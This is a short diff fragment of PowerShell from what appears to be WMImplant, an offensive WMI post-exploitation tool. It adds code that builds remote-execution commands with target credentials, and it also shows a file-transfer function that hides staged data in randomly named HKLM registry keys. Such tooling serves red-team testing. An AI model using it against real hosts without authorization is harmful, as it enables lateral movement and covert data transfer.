+    if($Command -ne '')
+    {
+        $Command += " -Target $GenTarget"
+        if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
+        {
+            $Command += " -RemoteUser $GenUsername -RemotePass $GenPassword`n"
+        }
+        # Print command
+        $Command
+    }
+    
 } #End of Function
 
 function Invoke-ProcessPunisher
@@ -4037,6 +3652,7 @@ function Invoke-FileTransferWMImplant
         # Uses HKLM/Software/Microsoft
         #2147483650 - hklm, 2147483649 - kkcu, 
 
+        Write-Verbose "Creating registry key to store data"
         $fullregistrypath = "HKLM:\Software\Microsoft\Windows"
         $registryupname = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
         $registrydownname = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
